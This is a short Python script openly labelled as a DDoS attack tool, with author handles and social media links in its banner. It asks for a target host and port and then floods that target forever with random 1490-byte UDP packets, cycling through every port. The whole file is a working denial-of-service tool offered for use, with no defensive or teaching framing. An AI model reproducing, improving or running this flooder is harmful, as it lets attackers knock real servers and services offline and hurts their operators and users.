#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("clear")
os.system("figlet DDos Attack")
print "Author   : @EXLIPSE#1334"
print "Code : @EXLIPSE"
print "Instahram   : @EXLIPSE"
print "Facebook : https://www.facebook.com/@EXLIPSE"
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
ip = input("Enter Attack Host Target : ")
port = input("Enter Attack Port Target      : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)

print("Attack Started To Target")
print("Terimakasih Udah Menggunakan Tools Buatan @ECLIPSE#1334")
time.sleep(5)
sent = 5555
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 5555
    port = port + 1
    print("Send Attack Host %s And packet to %s Target Port:%s"%(sent,ip,port))
    if port == 65534:
        port = 1